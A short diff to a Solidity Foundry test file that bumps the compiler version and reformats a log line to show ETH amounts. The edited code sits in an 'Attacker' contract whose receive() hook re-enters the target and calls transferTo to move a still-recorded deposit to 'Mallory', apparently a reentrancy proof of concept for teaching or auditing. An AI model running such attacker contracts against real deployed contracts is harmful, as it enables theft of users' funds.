@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.17;
+pragma solidity 0.8.20;
 
 import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 import "forge-std/Test.sol";
@@ -72,7 +72,7 @@ contract Attacker {
 
     receive() external payable {
         uint256 amount = target.userBalance(address(this));
-        console.log("Malicious contract received %s but their deposit is still %s!", msg.value, amount);
+        console.log("Malicious contract received %s ETH but their deposit is still %s ETH!", msg.value/1 ether, amount/1 ether);
         target.transferTo(wallet, amount);
         console.log("Deposit transfered internally to Mallory");        
     }
